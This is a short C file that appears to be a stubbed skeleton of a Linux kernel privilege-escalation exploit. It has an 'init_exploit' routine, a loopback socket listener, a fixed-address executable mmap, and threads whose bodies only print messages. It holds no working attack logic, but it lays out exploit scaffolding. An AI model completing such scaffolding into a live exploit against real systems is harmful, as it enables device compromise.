#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>

pthread_mutex_t done_lock;
pthread_cond_t done;

unsigned long MAGIC = 0;

void *hello_world(void *arg) {
	printf("hello_world\n");
	return NULL;
}

void *search_goodnum(void *arg) {
	printf("goodnum\n");
	return NULL;
}

void *send_magicmsg(void *arg) {
	printf("aquired first");
	printf("send_magicmsg\n");
	return NULL;
}



void *accept_socket(void *arg){
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	yes = 1;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if(ret < 0) {
			printf("**** SOCK_PROC failed ****\n");
			while(1) {
				sleep(10);
			}
		} else {
			printf("i have a client like hookers.\n");
		}
	}

	return NULL;
}




void init_exploit() {
	pthread_t th1, th2, th3;
	unsigned long addr;

	pthread_create(&th1, NULL, accept_socket, NULL);

	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    MAGIC = addr;
    if ((long)addr >= 0) {
        printf("first mmap failed?\n");
        while (1) {
            sleep(10);
        }
    }

	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, search_goodnum, NULL);
	pthread_create(&th3, NULL, send_magicmsg, NULL);
	pthread_cond_wait(&done, &done_lock);
}


int main () {
  init_exploit();
  return 0;
}
